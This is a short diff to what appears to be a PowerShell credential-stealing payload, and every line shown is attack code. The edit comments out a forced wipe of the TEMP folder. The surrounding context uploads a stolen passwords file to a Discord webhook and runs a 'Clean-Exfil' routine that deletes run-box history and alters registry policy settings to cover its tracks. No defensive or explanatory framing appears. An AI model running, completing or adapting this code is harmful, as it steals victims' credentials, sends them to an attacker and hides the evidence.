@@ -44,7 +44,7 @@ if (-not ([string]::IsNullOrEmpty($hookurl))){Upload-Discord -file "$env:TEMP/$e
 function Clean-Exfil { 
 
 # empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
@@ -64,7 +64,7 @@ RI $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 # empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
 Set-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableRegistryTools -Value 0 -ErrorAction SilentlyContinue
